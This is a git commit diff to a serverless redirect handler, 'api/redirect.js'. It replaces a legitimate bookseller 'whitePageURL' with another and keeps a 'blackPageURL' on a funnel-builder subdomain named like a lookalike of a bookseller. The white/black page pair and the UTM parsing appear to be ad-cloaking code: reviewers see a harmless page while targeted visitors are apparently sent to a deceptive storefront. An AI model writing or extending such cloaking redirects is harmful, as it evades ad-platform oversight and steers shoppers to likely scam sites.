ae95fa8681e684bd7f00d2012690579df3745cf2
rmeeesumraza <github@snobay.com>
2025-05-19 01:15:53 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://bookoutlet.com/book/friends-lovers-and-the-big-terrible-thing-a-memoir/perry-matthew/9781250866455B";
+    const whitePageURL = "https://www.books2door.com/products/the-kindness-method-by-shahroo-izadi-the-highly-effective-and-extremely-enjoyable-way-to-change-your-habits-non-fiction-paperback";
     const blackPageURL = "https://wabebookscom.myfunnelish.com/cshhhhhn-1747502439037021";
   
     // Parse the UTM parameters from the request URL
